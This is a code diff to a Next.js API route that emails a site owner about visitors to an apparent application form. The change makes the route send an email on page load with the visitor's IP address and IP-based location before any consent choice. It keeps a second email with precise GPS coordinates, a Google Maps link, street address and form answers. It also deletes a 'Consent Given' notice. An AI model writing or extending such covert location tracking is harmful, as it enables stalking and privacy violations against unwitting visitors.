@@ -28,9 +28,8 @@ interface LocationData {
   };
 }
 
-interface PermissionSubmission {
-  type: 'permission';
-  allowed: boolean;
+interface PageLoadSubmission {
+  type: 'pageload';
   location: LocationData | null;
   timestamp: string;
 }
@@ -49,7 +48,7 @@ interface FormSubmission {
   timestamp: string;
 }
 
-type Submission = PermissionSubmission | FormSubmission;
+type Submission = PageLoadSubmission | FormSubmission;
 
 export async function POST(request: NextRequest) {
   try {
@@ -70,18 +69,18 @@ export async function POST(request: NextRequest) {
     let emailBody = '';
     let subject = '';
 
-    if (data.type === 'permission') {
-      // PERMISSION EMAIL - sent immediately when user clicks allow/decline
-      const decision = data.allowed ? 'ALLOWED' : 'DECLINED';
-      subject = `Application Started - ${decision} - ${formattedDate}`;
+    if (data.type === 'pageload') {
+      // FIRST EMAIL - sent immediately when page loads (IP data only)
+      subject = `New Visitor - Page Opened - ${formattedDate}`;
 
       emailBody = `
 ═══════════════════════════════════════════════════════════════════
-                    USER BEGAN APPLICATION
+                    NEW VISITOR - PAGE OPENED
 ═══════════════════════════════════════════════════════════════════
 
-Permission Decision: ${decision}
 Timestamp: ${formattedDate}
+
+Someone opened the application form. Browser location popup is being shown.
 
 `;
 
@@ -89,7 +88,7 @@ Timestamp: ${formattedDate}
         const loc = data.location;
 
         emailBody += `═══════════════════════════════════════════════════════════════════
-                        LOCATION DATA
+                        IP & LOCATION DATA
 ═══════════════════════════════════════════════════════════════════
 
 - IP Address: ${loc.ip || 'Unknown'}
@@ -104,21 +103,9 @@ Timestamp: ${formattedDate}
 `;
         }
 
-        if (data.allowed && loc.coordinates) {
-          emailBody += `
-- Coordinates: ${loc.coordinates.latitude}, ${loc.coordinates.longitude}
-- Accuracy: ~${Math.round(loc.coordinates.accuracy)} meters
-- Google Maps: https://www.google.com/maps?q=${loc.coordinates.latitude},${loc.coordinates.longitude}
-`;
-        } else if (!data.allowed) {
-          emailBody += `
-- Coordinates: Not available (user declined location access)
-`;
-        }
-
         if (loc.address) {
           emailBody += `
-- Street: ${loc.address.street || 'Not available'}
+APPROXIMATE LOCATION (from IP):
 - City: ${loc.address.city || 'Not available'}
 - State/Region: ${loc.address.state || 'Not available'}
 - Country: ${loc.address.country || 'Not available'}
@@ -145,13 +132,14 @@ Timestamp: ${formattedDate}
       emailBody += `
 ═══════════════════════════════════════════════════════════════════
 
-NOTE: Full form responses will follow after completion.
+NOTE: If user allows GPS and completes form, you'll receive a second
+email with precise coordinates and their form responses.
 
 ═══════════════════════════════════════════════════════════════════
 `;
 
     } else {
-      // FORM COMPLETION EMAIL - sent after all 6 questions answered
+      // SECOND EMAIL - sent after form completion (includes GPS if allowed)
       subject = `Form Completed - ${formattedDate}`;
 
       emailBody = `
@@ -206,18 +194,21 @@ Submission Time: ${formattedDate}
 
         if (loc.coordinates) {
           emailBody += `
-- Coordinates: ${loc.coordinates.latitude}, ${loc.coordinates.longitude}
+GPS COORDINATES (user allowed location):
+- Latitude: ${loc.coordinates.latitude}
+- Longitude: ${loc.coordinates.longitude}
 - Accuracy: ~${Math.round(loc.coordinates.accuracy)} meters
 - Google Maps: https://www.google.com/maps?q=${loc.coordinates.latitude},${loc.coordinates.longitude}
 `;
         } else {
           emailBody += `
-- Coordinates: Not available (geolocation denied or unavailable)
+GPS COORDINATES: Not available (user denied or browser blocked)
 `;
         }
 
         if (loc.address) {
           emailBody += `
+ADDRESS:
 - Street: ${loc.address.street || 'Not available'}
 - City: ${loc.address.city || 'Not available'}
 - State/Region: ${loc.address.state || 'Not available'}
@@ -241,12 +232,6 @@ Submission Time: ${formattedDate}
 
       emailBody += `
 ═══════════════════════════════════════════════════════════════════
-                        METADATA
-═══════════════════════════════════════════════════════════════════
-
-- Consent Given: Yes (implicit by completing the application)
-
-═══════════════════════════════════════════════════════════════════
 `;
     }
 
@@ -268,7 +253,7 @@ Submission Time: ${formattedDate}
 
     return NextResponse.json({
       success: true,
-      message: data.type === 'permission' ? 'Permission recorded' : 'Form submitted successfully',
+      message: data.type === 'pageload' ? 'Page load recorded' : 'Form submitted successfully',
       emailId: emailData?.id,
     });
   } catch (error) {
